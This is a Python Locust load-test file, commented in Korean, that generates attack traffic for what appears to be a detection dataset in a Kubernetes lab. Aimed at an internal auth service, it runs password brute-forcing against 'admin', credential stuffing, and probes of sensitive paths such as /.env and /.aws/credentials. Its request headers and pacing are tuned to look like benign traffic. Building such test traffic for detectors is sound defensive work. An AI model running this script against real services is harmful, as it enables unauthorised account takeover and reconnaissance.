# k8s_bruteforce_locustfile.py — 시나리오 3: 능동적 스캐닝 + 브루트포스 (T1595, T1110)
#
# 전제: 침해된 pod에서 내부 서비스를 스캔(T1595)하고, 인증 정보를 노려
#       내부 서비스(auth) 로그인에 사전 기반 브루트포스(T1110)를 수행한다.
# 성격: 대상은 우리 내부 서비스(auth). 실패 로그인(401)과 없는 경로 스캔(404)만 발생 → 파괴적 동작 없음.
#       (의도 기준 라벨: 4xx가 나도 시도 자체가 공격.)
#
# ★ confound 정렬(중요): 이 시나리오는 benign auth 와 **같은 엔드포인트(/api/auth/login)** 를 때린다.
#   따라서 속도·클라이언트 지문을 benign 과 동일하게 맞춰 "속도/지문 = 공격" 지름길을 차단한다.
#   → benign(common.harness.BaseUser)과 동일한 SHARED_HEADERS + 혼합 pacing(PACE_PROFILES) 사용.
#   ※ attacker pod 는 configmap(/mnt)에 attack 파일만 마운트되어 common.harness 를 import 할 수 없으므로
#     아래 값은 인라인한다. **common/harness.py 의 SHARED_HEADERS·PACE_PROFILES 와 반드시 동일하게 유지**할 것.
#
# 실행: run.sh attack (attacker pod 안). AUTH_HOST 기본 http://auth-service.deepmesh.svc:8080.

import os
import random
import itertools
from locust import HttpUser, task

# ── benign 과 공유(=confound 제거). common/harness.py 와 동기화 필수 ──────────
SHARED_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) DeepMeshClient/1.0",
    "Accept": "application/json, text/html;q=0.9, */*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
}
_PACE_NAMED = {"human": (4.0, 12.0), "active": (0.5, 2.0), "burst": (0.02, 0.3)}
PACE_PROFILES = list(_PACE_NAMED.values())          # 동일 가중치 추첨
_FORCED = os.environ.get("PACE_PROFILE")            # benign 과 동일한 디버그 훅

AUTH_HOST = os.environ.get("AUTH_HOST", "http://auth-service.deepmesh.svc:8080")
VICTIM = os.environ.get("VICTIM_USER", "admin")

# 트래픽 생성용 소규모 예시 사전(실제 크래킹 목적 아님)
PWLIST = ["123456", "password", "admin", "root", "qwerty", "letmein",
          "test1234", "P@ssw0rd", "admin123", "12345678"]

# 내부 서비스 스캐닝 대상 경로(존재하지 않을 법한 민감 경로 → 404 버스트)
SCAN_PATHS = ["/.env", "/.git/config", "/actuator/env", "/actuator/health",
              "/admin", "/api/internal", "/config", "/.aws/credentials",
              "/swagger-ui.html", "/metrics"]


class K8sBruteUser(HttpUser):
    host = AUTH_HOST
    _pace = (4.0, 12.0)   # on_start 전 첫 호출 대비 기본값

    def wait_time(self):
        # benign 과 동일 분포에서 사용자별로 추첨한 pacing (고정 fast pacing 아님 → 속도로 라벨 못 가름)
        lo, hi = self._pace
        return random.uniform(lo, hi)

    def on_start(self):
        self._pace = _PACE_NAMED[_FORCED] if _FORCED in _PACE_NAMED else random.choice(PACE_PROFILES)
        self.client.headers.update(SHARED_HEADERS)   # benign 과 동일 지문
        self._pw = itertools.cycle(PWLIST)

    # --- T1110: 내부 서비스 인증정보 브루트포스 (고정 victim + 패스워드 순회) ---
    @task(4)
    def brute_login(self):
        pw = next(self._pw)
        with self.client.post("/api/auth/login",
                              json={"username": VICTIM, "password": pw},
                              catch_response=True,
                              name="POST /api/auth/login [brute]") as r:
            r.success()   # 401 기대(실패 로그인). 시도 자체가 공격.

    # --- T1110.004: credential stuffing (user/pass 쌍 순회) ---
    @task(2)
    def cred_stuffing(self):
        pw = next(self._pw)
        user = f"user{hash(pw) % 1000}"
        with self.client.post("/api/auth/login",
                              json={"username": user, "password": pw},
                              catch_response=True,
                              name="POST /api/auth/login [stuffing]") as r:
            r.success()

    # --- T1595: 능동적 스캐닝 (민감 경로 다발 → 404 버스트) ---
    @task(2)
    def scan_paths(self):
        for path in SCAN_PATHS:
            with self.client.get(path, catch_response=True, name="GET [scan]") as r:
                r.success()
